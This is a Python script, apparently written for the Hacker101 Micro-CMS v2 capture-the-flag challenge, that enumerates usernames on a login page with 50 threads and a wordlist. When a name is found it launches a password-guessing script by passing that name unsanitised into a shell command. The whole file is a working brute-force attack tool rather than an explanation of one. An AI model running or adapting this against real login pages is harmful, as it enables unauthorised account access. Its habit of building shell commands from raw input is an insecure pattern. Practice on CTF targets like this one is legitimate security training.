import requests
import threading
from collections import deque
import os

thread_count = 50

def check_username(q, url):
    while q:
        username = q.popleft()
        data = {"username": username, "password": "password"}
        response = requests.post(url, data=data)
        if "Unknown" not in response.text:  # Response text can be different, check the response and change before running the script.
            print(f"Username found: {username}")
            os.system("python Micro-CMSv2_password.py " + username) # Run the password script when username is found
        else:
            print(f"Incorrect username: {username}")

url = "https://ID.ctf.hacker101.com/login" # Change to your URL
# Username and password will be different for each person. This list might not work for everyone.
username_file = open("lists/names.txt", "r")
q = deque()
for name in username_file.readlines():  
    q.append(name)

for i in range(thread_count):
    threading.Thread(target=check_username, args=(q, url)).start()

    

